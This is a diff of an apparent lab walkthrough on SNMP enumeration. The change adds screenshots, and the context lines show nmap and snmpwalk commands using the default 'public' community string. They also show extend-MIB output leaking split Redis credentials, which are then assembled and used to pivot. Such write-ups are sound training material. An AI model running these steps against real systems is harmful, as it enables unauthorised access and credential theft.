@@ -34,6 +34,12 @@ nmap -sU -p 161 203.x.x.x -sV
 snmpwalk -v2c -c public 203.x.x.x system
 ```
 
+<img width="1483" height="628" alt="image" src="https://github.com/user-attachments/assets/a87b13a7-ffd1-434b-933c-039a33150e97" />
+
+
+<img width="1718" height="1249" alt="image" src="https://github.com/user-attachments/assets/ce2b7058-0350-40eb-9b6a-792c3e62024c" />
+
+
 Expected: system OIDs returned — confirms `public` community string is valid.
 
 ### Step 2 — Walk the Standard MIB Tree
@@ -63,6 +69,10 @@ NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cred-part2"   = STRING: 1s-cache@P
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."pul-cache-host"   = STRING: Cache endpoint: 203.x.x.x port 6379
 ```
 
+<img width="1581" height="1175" alt="image" src="https://github.com/user-attachments/assets/b99ad46c-555c-4d9c-b9bb-acac652fb65d" />
+
+
+
 ### Step 4 — Assemble the Credential
 
 Concatenate `pul-cred-part1` and `pul-cred-part2`:
@@ -74,6 +84,9 @@ redis-svc-user:r3d + 1s-cache@PUL!2024
 Extract the Redis endpoint from `pul-cache-host`:
 - **Host:** `203.x.x.x`
 - **Port:** `6379`
+
+<img width="2008" height="1276" alt="image" src="https://github.com/user-attachments/assets/a3ab10da-b1e1-4bab-ac48-c8e077bca0ab" />
+
 
 ### Step 5 — Document and Pivot
 
